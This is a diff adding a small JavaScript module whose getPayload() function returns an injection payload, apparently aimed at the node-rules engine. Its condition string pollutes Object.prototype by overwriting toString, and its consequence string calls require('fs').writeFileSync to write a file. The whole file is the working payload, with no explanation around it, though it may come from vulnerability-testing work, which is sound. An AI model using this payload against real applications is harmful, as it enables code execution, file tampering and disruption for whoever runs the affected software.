@@ -1,0 +1,8 @@
+function getPayload() {
+    return {
+        condition: "{}.__proto__.toString = 222",
+        consequence: "require(`fs`).writeFileSync(`node-rules`, '')"
+    };
+}
+
+module.exports = { getPayload };
